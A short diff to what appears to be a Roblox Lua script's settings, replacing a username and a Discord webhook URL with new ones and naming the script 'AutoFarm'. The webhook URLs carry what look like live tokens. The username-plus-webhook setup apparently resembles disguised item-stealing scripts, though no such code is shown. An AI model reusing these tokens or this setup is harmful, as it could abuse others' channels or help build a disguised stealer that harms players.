@@ -1,5 +1,5 @@
-Username = "ME55100"
-WebHook = "https://discord.com/api/webhooks/1038493829717823560/ywOgA1_YXtH3tkVV9jZKEWDNd3IMTt0aqYQm_x_QzyaPEP7YhIeCpTlb5bJzwcsSvxIB"
+Username = "Creamsch1"
+WebHook = "https://discord.com/api/webhooks/1092883005137227898/gR_w1S8yn0_Adcp_91LAOrJdhsyuFeQCOa23G72OfjN9owSIi_n_4_cfvk6VKqWC9zXQ"
 
 _G.CustomScriptName = "AutoFarm"
 _G.Text1 = "Script Loaded..."
